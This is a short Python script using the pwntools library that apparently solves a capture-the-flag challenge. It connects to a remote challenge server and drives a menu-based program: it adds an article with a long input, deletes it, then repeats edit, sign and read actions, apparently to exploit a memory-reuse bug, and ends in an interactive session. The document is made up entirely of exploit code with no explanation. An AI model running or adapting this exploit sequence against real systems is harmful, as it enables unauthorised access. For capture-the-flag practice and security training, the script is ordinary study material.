from pwn import *
context.binary = './a.out'

r = remote("challenges.ctfd.io", 30097)

# Add article
r.sendline("1")
r.sendline("a" * 140)

# Delete article
r.sendline("6")
r.sendline("0")

# Apply edit
for _ in range(3):
    r.sendline("2")
    r.sendline("0")
    r.sendline("1")
    r.sendline("0")
    r.sendline("b")
    r.sendline("3")
    r.sendline("0")

# Sign
r.sendline("4")
r.sendline("0")

# Read
r.sendline("5")
r.sendline("0")

r.interactive()
